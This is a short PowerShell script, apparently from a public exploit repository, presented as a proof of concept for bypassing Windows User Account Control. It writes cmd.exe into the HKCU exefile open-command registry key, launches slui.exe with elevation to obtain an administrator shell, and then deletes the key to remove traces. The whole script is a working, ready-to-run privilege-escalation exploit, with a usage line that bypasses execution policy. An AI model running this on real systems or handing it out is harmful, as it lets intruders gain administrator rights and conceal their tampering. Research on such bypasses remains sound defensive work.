<#
.SYNOPSIS
  Noninteractive version of script, for directly execute.
  This script is a proof of concept to bypass the User Access Control (UAC) via SluiFileHandlerHijackLPE
.NOTES
	File Name  : SluiHijackBypass_direct.ps1
	Author     : Gushmazuko
.LINK
	https://github.com/gushmazuko/WinBypass/blob/master/SluiHijackBypass_direct.ps1
	Original source: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
.EXAMPLE
	Load "cmd.exe" (By Default used 'arch 64'):
	powershell -exec bypass .\SluiHijackBypass_direct.ps1
#>

$program = "cmd.exe"
New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $program -Force
#For x64 shell in Windows x64:
Start-Process "C:\Windows\System32\slui.exe" -Verb runas
#For x86 shell in Windows x64:
#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process "C:\Windows\System32\slui.exe" -Verb runas"
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force